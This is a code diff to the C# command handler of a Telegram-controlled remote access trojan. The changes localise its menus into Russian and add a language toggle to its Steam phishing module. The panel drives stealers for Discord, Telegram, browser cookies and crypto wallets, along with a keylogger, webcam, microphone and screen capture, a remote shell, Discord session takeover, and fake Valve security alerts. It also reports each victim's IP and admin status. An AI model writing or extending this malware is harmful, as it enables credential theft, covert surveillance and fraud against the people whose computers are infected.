@@ -20,6 +20,10 @@ namespace FinalBot
         private readonly string _adminId;
         private readonly Dictionary<long, string> _userState = new Dictionary<long, string>();
 
+        private string _phishAgentName = "Valve_Security_Specialist_732";
+        private string _phishCookies = "";
+        private string _phishLang = "chinese"; // Default
+
         public CommandHandler(ITelegramBotClient botClient, string adminId)
         {
             _botClient = botClient;
@@ -200,14 +204,18 @@ namespace FinalBot
                     await HandleFullReport(message.Chat.Id);
                     break;
                 case "phish_steam_login":
-                    FinalBot.Modules.PhishManager.PrepareSteamFiles(_phishAgentName, _phishCookies);
+                    FinalBot.Modules.PhishManager.PrepareSteamFiles(_phishAgentName, _phishCookies, _phishLang);
                     FinalBot.Modules.PhishManager.LaunchSteamLogin();
                     await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Steam Login Launched!");
                     break;
                 case "phish_steam_alert":
-                    FinalBot.Modules.PhishManager.PrepareSteamFiles(_phishAgentName, _phishCookies);
+                    FinalBot.Modules.PhishManager.PrepareSteamFiles(_phishAgentName, _phishCookies, _phishLang);
                     FinalBot.Modules.PhishManager.LaunchSteamAlert();
                     await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Steam Alert Launched!");
+                    break;
+                case "phish_set_lang":
+                    _phishLang = (_phishLang == "english") ? "chinese" : "english";
+                    await ShowPhishingPanel(message.Chat.Id, message.MessageId);
                     break;
                 case "phish_set_agent":
                     _userState[message.Chat.Id] = "awaiting_agent_name";
@@ -377,96 +385,60 @@ namespace FinalBot
         {
             var markup = new InlineKeyboardMarkup(new[]
             {
-                new[]
-                {
-                    InlineKeyboardButton.WithCallbackData("💻 System", "panel_system"),
-                    InlineKeyboardButton.WithCallbackData("💼 Work", "panel_work"),
-                    InlineKeyboardButton.WithCallbackData("👁️ Spyware", "panel_spyware")
-                },
-                new[]
-                {
-                    InlineKeyboardButton.WithCallbackData("✍️ Set Name", "set_victim_name")
-                }
+                new[] { InlineKeyboardButton.WithCallbackData("💻 SYSTEM (Сеть, Файлы, Процессы, Терминал)", "panel_system") },
+                new[] { InlineKeyboardButton.WithCallbackData("💼 WORK (Стиллеры, Куки, Инжекты, Discord)", "panel_work") },
+                new[] { InlineKeyboardButton.WithCallbackData("👁️ SPYWARE (Микро, Камера, Скрины, Видео)", "panel_spyware") },
+                new[] { InlineKeyboardButton.WithCallbackData("✍️ Изменить имя ПК", "set_victim_name") }
             });
 
-            string pcUser = $"{Environment.MachineName}\\{Environment.UserName}";
             string adminStatus = VanguardCore.ElevationService.IsAdmin() ? "🟢 АДМИН" : "🟡 Обычный Юзер";
             string externalIp = FinalBot.Modules.SystemInfoModule.GetExternalIP();
-            string victimName = ConfigManager.VictimName; // Assuming we have such property
+            string pcUser = $"{Environment.MachineName}\\{Environment.UserName}";
             
-            string info = $"🎮 **ПАНИЛЬ УПРАВЛЕНИЯ**\n" +
-                          $"👤 **Клиентов:** 1\n" +
-                          $"🖥️ **Текущий:** `{Environment.UserName}@{Environment.MachineName}`\n" +
-                          $"⚡ **Статус:** {adminStatus}\n" +
-                          $"💻 **ПК:** `{Environment.MachineName}` | 👤 **Юзер:** `{Environment.UserName}`\n" +
-                          $"🌐 **IP:** `{externalIp}`\n" +
-                          $"📂 **Папка:** `{AppDomain.CurrentDomain.BaseDirectory}`\n" +
-                          $"⌛ **Время:** `{DateTime.Now:yyyy-MM-dd HH:mm:ss}`\n" +
-                          $"━━━━━━━━━━━━━━━━━━\n" +
-                          $"💻 **SYSTEM** (Сеть, Файлы, Процессы, Терминал, Настройки)\n" +
-                          $"💼 **WORK** (Стиллеры, Куки, Инжекты, Discord Remote)\n" +
-                          $"👁️ **SPYWARE** (Микро, Камера, Скрины, Видео, Кейлоггер)\n\n" +
+            string info = $"🎮 <b>ПАНЕЛЬ УПРАВЛЕНИЯ</b>\n" +
+                          $"👥 <b>Клиентов:</b> 1\n" +
+                          $"🖥️ <b>Текущий:</b> <code>{pcUser}</code>\n" +
+                          $"⚡ <b>Статус:</b> {adminStatus}\n" +
+                          $"💻 <b>ПК:</b> <code>{Environment.MachineName}</code> | 👤 <b>Юзер:</b> <code>{Environment.UserName}</code>\n" +
+                          $"🌐 <b>IP:</b> <code>{externalIp}</code>\n" +
+                          $"📂 <b>Папка:</b> <code>{AppDomain.CurrentDomain.BaseDirectory}</code>\n" +
+                          $"⌛ <b>Время:</b> <code>{DateTime.Now:yyyy-MM-dd HH:mm:ss}</code>\n\n" +
+                          $"💻 <b>SYSTEM</b> (Сеть, Файлы, Процессы, Терминал, Настройки)\n" +
+                          $"💼 <b>WORK</b> (Стиллеры, Куки, Инжекты, Discord Remote)\n" +
+                          $"👁️ <b>SPYWARE</b> (Микро, Камера, Скрины, Видео, Кейлоггер)\n\n" +
                           $"💡 Просмотр всех функций: /help или кнопка '🆘 Справка'";
 
             if (messageId > 0)
-            {
-                await _botClient.EditMessageTextAsync(chatId, messageId, info, parseMode: ParseMode.Markdown, replyMarkup: markup);
-            }
+                await _botClient.EditMessageTextAsync(chatId, messageId, info, parseMode: ParseMode.Html, replyMarkup: markup);
             else
-            {
-                await _botClient.SendTextMessageAsync(chatId, info, parseMode: ParseMode.Markdown, replyMarkup: markup);
-            }
+                await _botClient.SendTextMessageAsync(chatId, info, parseMode: ParseMode.Html, replyMarkup: markup);
         }
 
         private async Task ShowSystemPanel(long chatId, int messageId)
         {
             var markup = new InlineKeyboardMarkup(new[]
             {
-                new[]
-                {
-                    InlineKeyboardButton.WithCallbackData("📂 File Manager", "file_manager"),
-                    InlineKeyboardButton.WithCallbackData("📋 Clipboard", "clipboard")
-                },
-                new[]
-                {
-                    InlineKeyboardButton.WithCallbackData("⚙️ Sys Info", "system_info"),
-                    InlineKeyboardButton.WithCallbackData("📶 WiFi Data", "wifi_info")
-                },
-                new[]
-                {
-                    InlineKeyboardButton.WithCallbackData("📡 Shell Terminal", "system_shell"),
-                },
-                new[]
-                {
-                    InlineKeyboardButton.WithCallbackData("🔙 Back to Main", "back_to_main")
-                }
+                new[] { InlineKeyboardButton.WithCallbackData("📂 Файловый менеджер", "file_manager") },
+                new[] { InlineKeyboardButton.WithCallbackData("📋 Буфер обмена", "clipboard") },
+                new[] { InlineKeyboardButton.WithCallbackData("⚙️ Информация о системе", "system_info") },
+                new[] { InlineKeyboardButton.WithCallbackData("📶 Данные WiFi", "wifi_info") },
+                new[] { InlineKeyboardButton.WithCallbackData("📡 Терминал (Shell)", "system_shell") },
+                new[] { InlineKeyboardButton.WithCallbackData("🔙 Назад", "back_to_main") }
             });
 
-            await _botClient.EditMessageTextAsync(chatId, messageId, "💻 **SYSTEM PANEL**\nNetwork, Files, Processes, Terminal...", parseMode: ParseMode.Markdown, replyMarkup: markup);
+            await _botClient.EditMessageTextAsync(chatId, messageId, "💻 <b>SYSTEM PANEL</b>\nNetwork, Files, Processes, Terminal...", parseMode: ParseMode.Html, replyMarkup: markup);
         }
 
         private async Task ShowWorkPanel(long chatId, int messageId)
         {
             var markup = new InlineKeyboardMarkup(new[]
             {
-                new[]
-                {
-                    InlineKeyboardButton.WithCallbackData("🎮 Discord", "work_discord"),
-                    InlineKeyboardButton.WithCallbackData("✈️ Telegram", "work_telegram")
-                },
-                new[]
-                {
-                    InlineKeyboardButton.WithCallbackData("🍪 Cookies", "work_browsers"),
-                    InlineKeyboardButton.WithCallbackData("💰 Crypto", "work_crypto")
-                },
-                new[]
-                {
-                    InlineKeyboardButton.WithCallbackData("🎭 Phishing", "panel_phishing")
-                },
-                new[]
-                {
-                    InlineKeyboardButton.WithCallbackData("🔙 Back to Main", "back_to_main")
-                }
+                new[] { InlineKeyboardButton.WithCallbackData("🎮 Стиллер Discord", "work_discord") },
+                new[] { InlineKeyboardButton.WithCallbackData("✈️ Стиллер Telegram", "work_telegram") },
+                new[] { InlineKeyboardButton.WithCallbackData("🍪 Браузерные куки", "work_browsers") },
+                new[] { InlineKeyboardButton.WithCallbackData("💰 Крипто-кошельки", "work_crypto") },
+                new[] { InlineKeyboardButton.WithCallbackData("🎭 Центр Фишинга", "panel_phishing") },
+                new[] { InlineKeyboardButton.WithCallbackData("🔙 Назад", "back_to_main") }
             });
 
             string info = "💼 <b>WORK PANEL</b>\n" +
@@ -484,33 +456,25 @@ namespace FinalBot
 
         private async Task ShowPhishingPanel(long chatId, int messageId)
         {
+            string langEmoji = _phishLang == "english" ? "🇺🇸" : "🇨🇳";
+            string langText = _phishLang == "english" ? "English" : "Китайский";
+
             var markup = new InlineKeyboardMarkup(new[]
             {
-                new[]
-                {
-                    InlineKeyboardButton.WithCallbackData("📢 Steam Alert", "phish_steam_alert"),
-                    InlineKeyboardButton.WithCallbackData("🔑 Steam Login", "phish_steam_login")
-                },
-                new[]
-                {
-                    InlineKeyboardButton.WithCallbackData("👤 Set Agent", "phish_set_agent"),
-                    InlineKeyboardButton.WithCallbackData("🍪 Inject Cookies", "phish_set_cookies")
-                },
-                new[]
-                {
-                    InlineKeyboardButton.WithCallbackData("🔙 Back", "panel_work")
-                }
+                new[] { InlineKeyboardButton.WithCallbackData("🚀 Запустить VAC окно", "phish_steam_alert") },
+                new[] { InlineKeyboardButton.WithCallbackData($"{langEmoji} {langText}", "phish_set_lang") },
+                new[] { InlineKeyboardButton.WithCallbackData("✏️ Изменить имя агента", "phish_set_agent") },
+                new[] { InlineKeyboardButton.WithCallbackData("🍪 Загрузить куки", "phish_set_cookies") },
+                new[] { InlineKeyboardButton.WithCallbackData("🔙 Назад", "panel_work") }
             });
 
-            string statusText = string.IsNullOrEmpty(_phishCookies) ? "❌ Not Set" : "✅ Loaded";
-            string info = "🎭 <b>PHISHING CENTER</b>\n" +
+            string statusText = string.IsNullOrEmpty(_phishCookies) ? "❌ Не загружены" : "✅ Загружены";
+            string info = "🎭 <b>ЦЕНТР ФИШИНГА</b>\n" +
                           "━━━━━━━━━━━━━━━━━━\n" +
-                          $"🕵️ <b>Agent:</b> <code>{_phishAgentName}</code>\n" +
-                          $"🍪 <b>Cookies:</b> {statusText}\n" +
-                          "━━━━━━━━━━━━━━━━━━\n" +
-                          "1️⃣ <b>Set Agent:</b> Change the name displayed in the alert.\n" +
-                          "2️⃣ <b>Inject Cookies:</b> Paste base64 or JSON cookies.\n" +
-                          "3️⃣ <b>Launch:</b> Start the phishing process on victim PC.";
+                          $"🕵️ <b>Агент:</b> <code>{_phishAgentName}</code>\n" +
+                          $"🍪 <b>Куки:</b> {statusText}\n" +
+                          $"🌐 <b>Язык:</b> {langEmoji} {langText}\n" +
+                          "━━━━━━━━━━━━━━━━━━";
 
             await _botClient.EditMessageTextAsync(chatId, messageId, info, parseMode: ParseMode.Html, replyMarkup: markup);
         }
@@ -519,57 +483,36 @@ namespace FinalBot
         {
             var markup = new InlineKeyboardMarkup(new[]
             {
-                new[]
-                {
-                    InlineKeyboardButton.WithCallbackData("📸 Screenshot", "screenshot"),
-                    InlineKeyboardButton.WithCallbackData("🎥 Screen Video", "record_video")
-                },
-                new[]
-                {
-                    InlineKeyboardButton.WithCallbackData("🎤 Record Mic", "record_audio"),
-                    InlineKeyboardButton.WithCallbackData("📹 Webcam Pic", "webcam")
-                },
-                new[]
-                {
-                    InlineKeyboardButton.WithCallbackData("🎮 Join Discord", "discord_remote_start"),
-                    InlineKeyboardButton.WithCallbackData("⌨️ Keylogger", "keylogger_menu")
-                },
-                new[]
-                {
-                    InlineKeyboardButton.WithCallbackData("🔙 Back to Main", "back_to_main")
-                }
+                new[] { InlineKeyboardButton.WithCallbackData("📸 Снимок экрана", "screenshot") },
+                new[] { InlineKeyboardButton.WithCallbackData("🎥 Запись видео", "record_video") },
+                new[] { InlineKeyboardButton.WithCallbackData("🎤 Запись микрофона", "record_audio") },
+                new[] { InlineKeyboardButton.WithCallbackData("📹 Снимок с веб-камеры", "webcam") },
+                new[] { InlineKeyboardButton.WithCallbackData("🎮 Удаленный Discord", "discord_remote_start") },
+                new[] { InlineKeyboardButton.WithCallbackData("⌨️ Кейлоггер (Меню)", "keylogger_menu") },
+                new[] { InlineKeyboardButton.WithCallbackData("🔙 Назад", "back_to_main") }
             });
 
-            await _botClient.EditMessageTextAsync(chatId, messageId, "👁️ **SPYWARE PANEL**\nReal-time monitoring and control:", parseMode: ParseMode.Markdown, replyMarkup: markup);
+            await _botClient.EditMessageTextAsync(chatId, messageId, "👁️ <b>SPYWARE PANEL</b>\nReal-time monitoring and control:", parseMode: ParseMode.Html, replyMarkup: markup);
         }
 
         private async Task ShowDiscordRemoteMenu(long chatId, int messageId)
         {
             var markup = new InlineKeyboardMarkup(new[]
             {
-                new[]
-                {
-                    InlineKeyboardButton.WithCallbackData("🚀 Launch Controller", "discord_remote_launch"),
-                    InlineKeyboardButton.WithCallbackData("📊 Sessions: 1", "discord_sessions")
-                },
-                new[]
-                {
-                    InlineKeyboardButton.WithCallbackData("🔑 Active Token: N/A", "discord_set_token")
-                },
-                new[]
-                {
-                    InlineKeyboardButton.WithCallbackData("🔙 Back to Spyware", "panel_spyware")
-                }
+                new[] { InlineKeyboardButton.WithCallbackData("🚀 Запустить контроллер", "discord_remote_launch") },
+                new[] { InlineKeyboardButton.WithCallbackData("📊 Активные сессии: 1", "discord_sessions") },
+                new[] { InlineKeyboardButton.WithCallbackData("🔑 Установить токен", "discord_set_token") },
+                new[] { InlineKeyboardButton.WithCallbackData("🔙 Назад в Spyware", "panel_spyware") }
             });
 
-            string info = "🎮 **DISCORD REMOTE CONTROL**\n" +
+            string info = "🎮 <b>DISCORD REMOTE CONTROL</b>\n" +
                           "━━━━━━━━━━━━━━━━━━\n" +
-                          "🤖 **Status:** Ready\n" +
-                          "👥 **Managed Users:** 0\n" +
+                          "🤖 <b>Status:</b> Ready\n" +
+                          "👥 <b>Managed Users:</b> 0\n" +
                           "━━━━━━━━━━━━━━━━━━\n" +
                           "This module uses Selenium to take over Discord sessions. Requires Python and Chrome.";
 
-            await _botClient.EditMessageTextAsync(chatId, messageId, info, parseMode: ParseMode.Markdown, replyMarkup: markup);
+            await _botClient.EditMessageTextAsync(chatId, messageId, info, parseMode: ParseMode.Html, replyMarkup: markup);
         }
 
         private async Task ShowHelp(long chatId)
